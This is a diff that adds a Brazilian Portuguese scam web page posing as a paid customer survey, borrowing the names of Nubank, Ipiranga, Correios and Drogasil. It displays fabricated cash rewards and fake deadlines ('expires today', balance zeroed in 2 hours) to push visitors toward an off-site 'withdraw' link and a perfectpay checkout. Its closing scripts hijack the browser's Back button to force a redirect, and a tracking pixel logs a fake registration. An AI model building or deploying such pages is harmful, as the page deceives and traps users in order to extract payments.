@@ -1,0 +1,564 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="css/tG78FZJfa6dh.css">
+    <link rel="stylesheet" href="css/1ySqy3wnGnRU.css">
+    <script async="" src="js/hMDMvNz8IMVE.js"></script><script async="" src="js/JDSrc77MvDX7.js"></script>
+    <script async="" src="js/ND6gPHiq3be1.js"></script>
+    <script src="js/UX9iEp9bxvmI.js" crossorigin="anonymous"></script>
+    <link rel="icon" href="images/UTyPUnTj3kPA.jpg" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/UTyPUnTj3kPA.jpg">
+    <title>Opini</title>
+  </head>
+  <body>
+    <header>
+      <i class="fa-solid fa-bars"></i>
+      <!-- <img src="assets/images/google_logo.svg" alt=""> -->
+      <img src="images/ydRamsgBJj6D.png" alt="">
+
+      <span id="saldo">R$53,90</span>
+    </header>
+    <main>
+      <div class="popup__container" id="popupContainer" style="display: none">
+        <div class="popup" id="popup">
+          <div class="popup__titulo">
+            <h2>SALDO: R$100,00</h2>
+          </div>
+          <div class="popup__verificado">
+            <i class="fa-solid fa-check"></i>
+            <p>Parabéns!</p>
+          </div>
+          <div class="popup__descricao">
+            <h2>Você acaba de ganhar R$100,00</h2>
+            <p>por ter respodido a pesquisa</p>
+          </div>
+          <div class="popup__botao">
+            <button onclick="popupBaixar()">
+              <i class="fa-brands fa-pix"></i> SACAR AGORA
+            </button>
+          </div>
+        </div>
+        <div class="popup baixar" id="baixar">
+          <div class="popup__titulo">
+            <h2>SALDO: R$100,00</h2>
+          </div>
+          <div class="popup__vermelho">
+            <i class="fa-solid fa-x"></i>
+          </div>
+          <div class="popup__descricao baixar">
+            <p>
+              Foi identificado que você ainda
+              <span class="texto__azul">não possui nosso aplicativo.</span> Para
+              garantir a realização do saque é necessário obter o app.
+            </p>
+            <p>
+              <span class="texto__vermelho">Atenção:</span> Caso não seja feito
+              o download do app em até 2 horas, seu saldo será zerado!
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Cartão da Nubank -->
+
+      <div class="card nubank" id="nubank">
+        <div class="card__logo">
+          <img src="images/Sk5FVT9updtq.png" alt="">
+        </div>
+
+        <div class="card__satisfacao">
+          <h2>
+            De 0 a 5, que nota você da para o atendimento do Posto Ipiranga?
+          </h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Tem algum Posto Ipiranga na sua cidade?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você acha o preço da galosina justo?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Acho justo</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Poderia diminuir</p>
+            </div>
+          </div>
+        </div>
+
+        <button class="card__enviarResposta" id="enviarResposta" onclick="showLoadingB2()" disabled="">
+          Enviar avaliação
+        </button>
+
+        <!-- Popup da Nubank -->
+
+        <div class="popup-container" id="popupB2">
+          <script src="js/uCYG7MR9KGZE.js"></script>
+          <lord-icon src="https://cdn.lordicon.com/kndkiwmf.json" trigger="loop" delay="1000" colors="primary:#121331,secondary:#1663c7" style="width: 125px; height: 125px; display: flex; margin: 0 auto">
+          </lord-icon>
+
+          <span class="popup-text" style="font-size: 20px">Saldo atualizado!</span>
+          <span class="popup-text" style="font-size: 20px">Você recebeu:</span>
+          <span class="popup-text" style="
+              font-size: 40px;
+              font-weight: bold;
+              font-family: 'Montserrat', sans-serif;
+              margin-top: -10px;
+            ">R$ 88,60</span>
+          <span class="popup-text" style="font-size: 20px">pela classificação da Empresa do Ipiranga</span>
+        </div>
+      </div>
+
+      <!-- Popup do Bradesco -->
+
+      <div class="card bradesco" id="bradesco" style="display: none">
+        <div class="card__logo">
+          <img src="images/E2i71oLFwRuo.png" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>De 0 a 5, que nota você da para o atendimento do Correios?</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+
+        <div class="card__resposta">
+          <h2>Você já enviou alguma encomenda pelo correio?</h2>
+
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="card__resposta">
+          <h2>Você já recebeu um produto danificado do correio?</h2>
+          <div class="resposta__gradeContainer3">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p>Nunca</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p>Uma vez</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p>Sempre</p>
+            </div>
+          </div>
+        </div>
+
+        <button class="card__enviarResposta" id="enviarResposta" onclick="showLoadingB3()" disabled="">
+          Enviar avaliação
+        </button>
+
+        <!-- Popup da Nubank -->
+
+        <div class="popup-container" id="popupB3">
+          <script src="js/uCYG7MR9KGZE.js"></script>
+          <lord-icon src="https://cdn.lordicon.com/kndkiwmf.json" trigger="loop" delay="1000" colors="primary:#121331,secondary:#1663c7" style="width: 125px; height: 125px; display: flex; margin: 0 auto">
+          </lord-icon>
+
+          <span class="popup-text" style="font-size: 20px">Saldo atualizado!</span>
+          <span class="popup-text" style="font-size: 20px">Você recebeu:</span>
+          <span class="popup-text" style="
+              font-size: 40px;
+              font-weight: bold;
+              font-family: 'Montserrat', sans-serif;
+              margin-top: -10px;
+            ">R$ 62,50</span>
+          <span class="popup-text" style="font-size: 20px">pela classificação da Empresa do Correios</span>
+        </div>
+      </div>
+
+      <!-- <div class="card americanas" id="americanas">
+            <div class="card__logo">
+                <img src="assets/images/americanas.webp" alt="">
+            </div>
+            <div class="card__satisfacao">
+                <h2>De 0 a 5, que nota você da para o atendimento da Americanas?</h2>
+                <div class="card__gradeContainer">
+                    <div class="card__grade" id="card__grade1" onclick="toggleCard(this)"><i class="fa-regular fa-star" id="star1"></i></div>
+                    <div class="card__grade" id="card__grade2" onclick="toggleCard(this)"><i class="fa-regular fa-star" id="star2"></i></div>
+                    <div class="card__grade" id="card__grade3" onclick="toggleCard(this)"><i class="fa-regular fa-star" id="star3"></i></div>
+                    <div class="card__grade" id="card__grade4" onclick="toggleCard(this)"><i class="fa-regular fa-star" id="star4"></i></div>
+                    <div class="card__grade" id="card__grade5" onclick="toggleCard(this)"><i class="fa-regular fa-star" id="star5"></i></div>
+                </div>
+                <div class="card__gradeDescricao">
+                    <p>Muito ruim</p>
+                    <p>Muito bom</p>
+                </div>
+            </div>
+            <div class="card__resposta">
+                <h2>Você já comprou algum produto na Americanas?</h2>
+                <div class="resposta__gradeContainer">
+                    <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+                        <p>Sim</p>
+                    </div>
+                    <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+                        <p>Não</p>
+                    </div>
+                </div>
+            </div>
+            <div class="card__resposta">
+                <h2>Recomenda essa loja?</h2>
+                <div class="resposta__gradeContainer">
+                    <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+                        <p>Sim</p>
+                    </div>
+                    <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+                        <p>Não</p>
+                    </div>
+                </div>
+            </div>
+            <button class="card__enviarResposta" id="enviarResposta" onclick="americanas()" disabled>Enviar avaliação</button>
+        </div> -->
+      <div class="card mcdonalds" id="mcdonalds" style="display: none">
+        <div class="card__logo">
+          <img src="images/tKQlvZFxBRpF.png" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>De 0 a 5, que nota você da para o atendimento da Drogasil?</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você acha o preço dos remédios da Drogasil justo?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você sempre encontrar os remédios que procura na Drogasil?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Quase sempre</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>As vezes</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="showLoadingB4()" disabled="">
+          Enviar avaliação
+        </button>
+
+        <!-- Popup da Nubank -->
+
+        <div class="popup-container" id="popupB4">
+          <script src="js/F0kRSmonPv1S.js"></script>
+          <lord-icon src="https://cdn.lordicon.com/kndkiwmf.json" trigger="loop" delay="1000" colors="primary:#121331,secondary:#1663c7" style="width: 125px; height: 125px; display: flex; margin: 0 auto">
+          </lord-icon>
+
+          <span class="popup-text" style="font-size: 20px">Saldo atualizado!</span>
+          <span class="popup-text" style="font-size: 20px">Você recebeu:</span>
+          <span class="popup-text" style="
+              font-size: 40px;
+              font-weight: bold;
+              font-family: 'Montserrat', sans-serif;
+              margin-top: -10px;
+            ">R$ 25,00</span>
+          <span class="popup-text" style="font-size: 20px">pela classificação da Empresa do Drogasil</span>
+        </div>
+      </div>
+
+      <div class="card finalizacao" id="finalizacao" style="display: none">
+        <div class="finalizacao__titulo">
+          <h1>PARABÉNS!</h1>
+          <h2>Seu saldo subiu!</h2>
+        </div>
+        <div class="finalizacao__trofeu">
+          <img src="images/5WowjlI7zUn5.png" alt="">
+          <h2>R$230,00</h2>
+        </div>
+        <div class="finalizacao__descricao">
+          <p>
+            Você acaba de ganhar R$230,00, por ter avaliado as empresas
+            cadastradas no nosso aplicativo.
+          </p>
+          <span>**Seu crédito de R$230,00 expira hoje, dia
+            <span id="todayDate"></span></span>
+          <p>
+            Para cadastrar sua chave PIX e realizar o seu saque, clique no botão
+            abaixo para entender o passo a passo...
+          </p>
+        </div>
+        <div class="finalizacao__botao">
+          <a href="https://pagina-oficial.store/p2"><button><i class="fa-brands fa-pix"></i> SACAR AGORA</button></a>
+        </div>
+      </div>
+    </main>
+
+    <script src="js/jZrgSAgbJUy9.js"></script>
+    <script src="js/SW9D3npV7rCD.js"></script>
+    <script src="js/HNSuwfyVWJAP.js"></script>
+    <script src="js/aGAFWsg4xw7t.js"></script>
+    <script src="js/F1tA8fNpQ9r9.js"></script>
+    <script src="js/VeX4RFuT42le.js"></script>
+    <script>
+      $(document).ready(function () {
+        let data = new Date();
+
+        var date = data.getDate();
+        var month = [
+          "Janeiro",
+          "Fevereiro",
+          "Março",
+          "Abril",
+          "Maio",
+          "Junho",
+          "Julho",
+          "Agosto",
+          "Setembro",
+          "Outubro",
+          "Novembro",
+          "Dezembro",
+        ][data.getMonth()];
+        var year = data.getFullYear();
+
+        $("#todayDate").html(`${date} de ${month} de ${year}**`);
+      });
+    </script>
+    <script type="text/javascript" src="js/0uaHoGLGQohn.js"></script>
+    <script>
+      var url_domain = window.location.hostname;
+      console.log(url_domain);
+      // console.log(result);
+      var utm_term = undefined;
+
+      var url_string = window.location.href;
+      var url = new URL(url_string);
+      var utm_campaign_value = url.searchParams.get("utm_campaign");
+      var url_domain = window.location.hostname;
+
+      if (utm_term == undefined) {
+        var utm_campaign = "xcon=" + utm_campaign_value;
+      }
+      function setUrlParams2(el) {
+        var term = utm_campaign;
+        if (el.href.indexOf("#") == -1) {
+          var src = "";
+          var querystring = location.search;
+          var querystring_without_int_mark = querystring.split("?", 2)[1];
+
+          var existsUrl = el.href;
+          var existsquerystring = existsUrl.split("?", 2)[1];
+
+          // console.log(querystring_without_int_mark, existsquerystring)
+
+          if (
+            existsquerystring === undefined &&
+            querystring_without_int_mark !== undefined
+          ) {
+            el.href =
+              existsUrl.split("?", 2)[0] +
+              "?" +
+              querystring_without_int_mark +
+              "&" +
+              utm_campaign;
+            return;
+          }
+          if (
+            existsquerystring !== undefined &&
+            querystring_without_int_mark !== undefined
+          ) {
+            el.href =
+              existsUrl.split("?", 2)[0] +
+              "?" +
+              existsquerystring +
+              "&" +
+              querystring_without_int_mark +
+              "&" +
+              utm_campaign;
+            return;
+          }
+
+          if (querystring_without_int_mark !== undefined) {
+            el.href =
+              existsUrl.split("?", 2)[0] +
+              "?" +
+              existsquerystring +
+              "&" +
+              querystring_without_int_mark +
+              "&" +
+              utm_campaign;
+          }
+          if (
+            querystring_without_int_mark == undefined &&
+            existsquerystring == undefined
+          ) {
+            el.href = existsUrl;
+          }
+          if (existsquerystring !== undefined) {
+            el.href = existsUrl;
+          }
+
+          console.log("url: " + existsUrl);
+        }
+      }
+      var links = document.querySelectorAll("a");
+
+      links.forEach(setUrlParams2);
+    </script>
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js"
+      );
+      fbq("init", "187284437751040");
+      fbq("track", "PageView");
+      fbq("track", "CompleteRegistration");
+    </script>
+    <noscript><img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=187284437751040&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+  
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const back_redirect_back_link = 'https://pagina-oficial.store/pb’;
+    const backRedirectValue = "|BackRedirect";
+    const utmParameterName = 'src';
+
+    const url = new URL(window.location.href);
+    const params = new URLSearchParams(url.search);
+    const utmParam = params.get(utmParameterName);
+
+    if (utmParam !== null) {
+        params.set(utmParameterName, utmParam + backRedirectValue);
+    } else {
+        params.append(utmParameterName, backRedirectValue.slice(1));
+    }
+
+    const queryString = params.toString();
+    const fullRedirectLink = back_redirect_back_link + "?" + queryString;
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.onpopstate = function() {
+        setTimeout(function() {
+            location.href = fullRedirectLink;
+        }, 1);
+    };
+});
+</script>
+<script>
+  let prefix = ["https://checkout.perfectpay.com.br"];
+
+function getParams() {
+   let t = "",
+       e = window.top.location.href,
+       r = new URL(e);
+   if (null != r) {
+       let a = r.searchParams.get("utm_source"),
+           n = r.searchParams.get("utm_medium"),
+           o = r.searchParams.get("utm_campaign"),
+           m = r.searchParams.get("utm_term"),
+           c = r.searchParams.get("utm_content"); - 1 !== e.indexOf("?") && (t = `&sck=${a}|${n}|${o}|${m}|${c}`), console.log(t)
+   }
+   return t
+}! function() {
+   var t = new URLSearchParams(window.location.search);
+   t.toString() && document.querySelectorAll("a").forEach(function(e) {
+       for (let r = 0; r < prefix.length; r++) - 1 !== e.href.indexOf(prefix[r]) && (-1 === e.href.indexOf("?") ? e.href += "?" + t.toString() + getParams() : e.href += "&" + t.toString() + getParams())
+   })
+}(); </script>
+</body></html>
